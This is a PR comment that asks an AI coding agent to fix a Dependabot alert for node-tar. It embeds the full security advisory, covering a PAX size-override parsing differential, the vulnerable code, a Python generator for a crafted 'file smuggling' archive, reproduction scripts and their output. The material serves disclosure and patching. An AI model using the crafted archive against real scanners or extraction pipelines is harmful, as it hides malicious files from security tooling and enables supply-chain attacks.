@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** tar (npm)
- **Severity:** MEDIUM
- **Vulnerable versions:** <= 7.5.15
- **Patched version:** 7.5.16
- **CVE:** CVE-2026-53655
- **GHSA:** GHSA-vmf3-w455-68vh
- **Manifest:** pnpm-lock.yaml

**Summary:**
node-tar applies PAX size override to intermediary GNU long-name/long-link headers, causing tar parser interpretation differential (file smuggling)

**Description:**
### Summary

`tar` (node-tar) applies a PAX extended header's `size=` record (and other PAX
overrides) to the **next header entry of any type**, including intermediary
metadata headers such as a GNU long-name (`L`) or long-link (`K`) entry. Per
POSIX pax, a PAX extended header (`x`) describes the *next file entry*, not the
intermediary extension headers that may sit between the `x` header and the file
it annotates. Because node-tar lets the PAX `size` override the byte length of
an intervening `L`/`K`/`x` header, an attacker can desynchronize node-tar's
stream cursor relative to every other mainstream tar implementation
(GNU tar, libarchive/bsdtar, Python `tarfile`, and the now-fixed `tar-rs` /
`astral-tokio-tar`).

The result is a tar parser **interpretation differential** (CWE-436): a single
crafted archive yields a different set of members under node-tar than under the
reference tar tools. An attacker can use this to hide a member from one parser
while it is visible to another, which defeats security tooling whose scanner and
extractor disagree on archive contents (e.g. a malware/secret scanner that lists
entries with one library while a downstream step extracts with another). node-tar
is one of the most widely deployed JavaScript tar libraries (it backs `npm`'s own
package-tarball handling and is a transitive dependency of a very large fraction
of the npm ecosystem), so the blast radius for "files that extract differently
depending on the tool" is broad.

This is the same root cause and fix that was just addressed upstream in the Rust
tar ecosystem (`tar-rs` / `astral-tokio-tar`); node-tar carries the equivalent
defect and has no equivalent guard.

### Impact

- CWE-436 Interpretation Conflict / inconsistent tar parsing (the same class as
  the prior tar "smuggling" advisories GHSA-j5gw-2vrg-8fgx and
  GHSA-fp55-jw48-c537).
- A crafted archive can present one logical member list to a tool that lists or
  scans with node-tar and a different member list to GNU tar / libarchive /
  Python tarfile (and vice versa). This lets a malicious file be hidden from a
  scanner that uses a different parser than the eventual extractor, or hidden
  from node-tar-based inspection while still landing on disk via a system `tar`.
- No authentication is required; the only precondition is that a victim parses
  an attacker-supplied tar with node-tar. Tar archives are routinely fetched
  from untrusted sources (package registries, user uploads, CI artifacts,
  container layers).
- Severity: Medium. Impact is integrity-of-archive-interpretation, not direct
  RCE; it is a building block for supply-chain / scanner-evasion attacks rather
  than a standalone code-execution primitive.

### Vulnerable code (file:line)

`src/header.ts` (compiled to `dist/esm/header.js:49` and
`dist/commonjs/header.js:85` in the published `tar@7.5.15`):

```ts
// Header.decode(buf, off, ex, gex)
this.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12)
```

`ex` is the currently-accumulated PAX **local** extended header and `gex` the
PAX **global** header. The `size` override from `ex`/`gex` is applied
unconditionally to whatever header is being decoded next — there is no check
that the header being decoded is a real *file* entry rather than an intermediary
extension header.

`src/parse.ts`, `[CONSUMEHEADER]` constructs the next header with the current
`EX`/`GEX` applied:

```ts
const header = new Header(chunk, position, this[EX], this[GEX])
```

and later branches on whether that header is a metadata entry. `this[EX]` is
cleared only in the non-meta (real file) branch:

```ts
if (entry.meta) {
  // L / K / x / g metadata entries: this[EX] is left intact here
  if (entry.size > this.maxMetaEntrySize) {
    entry.ignore = true
    this[STATE] = 'ignore'
    entry.resume()
  } else if (entry.size > 0) {
    this[META] = ''
    entry.on('data', c => (this[META] += c))
    this[STATE] = 'meta'
  }
} else {
  this[EX] = undefined   // EX cleared only once a real file entry is reached
}
```

When the stream is ordered `x (PAX, size=N) -> L (GNU long-name) -> file`, the
`L` header is constructed with `this[EX]` still set, so its `size`/`remain`
becomes `N` instead of the `L` payload's true length. node-tar then consumes `N`
bytes of "metadata" and resumes header parsing at the wrong offset, landing
mid-stream. Every other mainstream parser applies the PAX `size` only to the
following *file* entry, so they stay synchronized.

The correct behavior (and the fix shipped upstream in the Rust tar ecosystem) is
to **not** apply PAX `size`/overrides when the entry being decoded is itself an
extension header (`L` GNU long-name, `K` GNU long-link, `x` PAX local, `g` PAX
global).

### How input reaches the sink

`tar.list()`, `tar.extract()`/`tar.x()`, and `tar.Parse`/`tar.Unpack` all route
every 512-byte header block through `Header.decode(...)` with the
currently-accumulated `EX`/`GEX`. Any consumer that parses an attacker-supplied
archive — `tar.list`, `tar.extract`, or piping into the streaming `Parser` —
reaches the sink. No options need to be enabled; the default code path is
affected.

### Proof of concept

Archive layout (all standard, GNU-tar-producible blocks):

```
block 0 : x  header  (PAX local extended, typeflag 'x'), its own size = len(pax body)
block 1 : x  payload : the single PAX record  "...size=2048\n"
block 2 : L  header  (GNU long-name '././`@LongLink`'), real size = 13
block 3 : L  payload : "longname.txt\0"      (the long name for the next file)
block 4 : file header 'file_a', size = 16
block 5 : file_a body (16 bytes, zero-padded to 512)
block 6 : file header 'file_b', size = 16
block 7 : file_b body (16 bytes, zero-padded to 512)
```

Generator (`make_tar.py`, pure stdlib, no external deps):

```python
def hdr(name, size, typeflag):
    h = bytearray(512); name = name[:100]; h[0:len(name)] = name
    h[100:108] = b'0000644\0'; h[108:116] = b'0000000\0'; h[116:124] = b'0000000\0'
    h[124:136] = ('%011o\0' % size).encode(); h[136:148] = b'00000000000\0'
    h[156:157] = typeflag; h[257:263] = b'ustar\0'; h[263:265] = b'00'
    h[148:156] = b' ' * 8
    cs = sum(h); h[148:156] = ('%06o\0 ' % cs).encode()
    return bytes(h)

def pad(d):
    return d + b'\0' * ((512 - len(d) % 512) % 512)

def pax_record(key, val):              # length-prefixed PAX record "LEN key=val\n"
    body = b' %s=%s\n' % (key.encode(), str(val).encode()); n = len(body)
    while True:
        s = str(n).encode() + body
        if len(s) == n: break
        n = len(s)
    return s

pax = pax_record('size', 2048)         # malicious: claim size=2048 for the "next" entry
out  = hdr(b'PaxHeaders/x', len(pax), b'x') + pad(pax)
out += hdr(b'././`@LongLink`', 13, b'L') + pad(b'longname.txt\0')
out += hdr(b'file_a', 16, b'0')        + pad(b'AAAA_file_a_body')
out += hdr(b'file_b', 16, b'0')        + pad(b'BBBB_file_b_body')
out += b'\0' * 1024
open('pax-desync.tar', 'wb').write(out)
```

A negative-control archive is identical except the PAX record is
`pax_record('comment', 'x')` (no `size=`), written to `pax-control.tar`.

### End-to-end reproduction (against pinned version `tar@7.5.15`, latest release)

Install the published package into a clean project and parse both archives:

```
$ npm init -y >/dev/null && npm install tar@7.5.15
$ node -e "console.log(require('tar/package.json').version)"
7.5.15
$ grep -n "ex?.size ?? gex?.size" node_modules/tar/dist/esm/header.js
49:        this.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12);
```

`e2e.mjs`:

```js
import * as tar from 'tar'
async function listEntries(f){
  const got=[], warns=[]
  await tar.list({ file:f, onReadEntry:e=>{ got.push({path:e.path,size:e.size,type:e.type}); e.resume() },
                   onwarn:(code,_msg)=>warns.push(code) })
  return { got, warns }
}
const mal = await listEntries('pax-desync.tar')
console.log('MALICIOUS entries :', JSON.stringify(mal.got), 'warnings:', JSON.stringify(mal.warns))
const ctl = await listEntries('pax-control.tar')
console.log('CONTROL  entries :', JSON.stringify(ctl.got), 'warnings:', JSON.stringify(ctl.warns))
```

Verbatim output:

```
=== Deployed-consumer E2E: npm tar@7.5.15 (latest release) ===

[MALICIOUS] archive = x(PAX size=2048) -> L(GNU longname "longname.txt") -> file_a(16B) -> file_b(16B)
  tar.list() entries : []
  tar.list() warnings: ["TAR_ENTRY_INVALID"]

[NEGATIVE CONTROL] same archive, PAX record is "comment=x" (no size= override)
  tar.list() entries : [{"path":"longname.txt","size":16,"type":"File"},{"path":"file_b","size":16,"type":"File"}]
  tar.list() warnings: []
```

Reference parsers on the **same** `pax-desync.tar`:

```
$ tar tvf pax-desync.tar
-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # GNU tar

$ bsdtar tvf pax-desync.tar
-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # libarchive

$ python3 -c "import tarfile; print([m.name for m in tarfile.open('pax-desync.tar').getmembers()])"
['longname.txt']                                                      # Python tarfile
```

Interpretation differential: GNU tar, libarchive (bsdtar), and Python `tarfile`
all extract the member `longname.txt` from `pax-desync.tar`, whereas node-tar
`7.5.15` desynchronizes, raises `TAR_ENTRY_INVALID` (checksum failure from
landing mid-stream), and reports **zero** members. The negative control proves
the divergence is caused solely by the PAX `size=` override being applied to the
intermediary `L` header — when the same archive carries a PAX record without
`size=`, node-tar parses it identically to the reference tools
(`longname.txt`, `file_b`).

### Suggested fix

When decoding a header, do not apply PAX `size` (or other PAX overrides) if the
header being decoded is itself an extension header. Concretely, in
`src/parse.ts` clear/ignore `this[EX]` (and `this[GEX]` for `size`) when the
header's type is `ExtendedHeader`, `GlobalExtendedHeader`, `NextFileHasLongPath`
(GNU `L`), or `NextFileHasLongLinkpath` (GNU `K`); equivalently, in
`Header.decode`, gate the `ex?.size ?? gex?.size` override on the decoded type
not being one of those extension types. This mirrors the upstream Rust fix,
which guards `pax_size` with
`is_gnu_longname || is_gnu_longlink || is_pax_local_extensions || is_pax_global_extensions`.

A fix PR is being prepared against a private fork and will be linked here.

### Fix PR

To be linked from a private fork of the repository (the fix will not be pushed
to any public fork or to upstream during embargo).

### Credits

Reported by tonghuaroot.

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/2093)
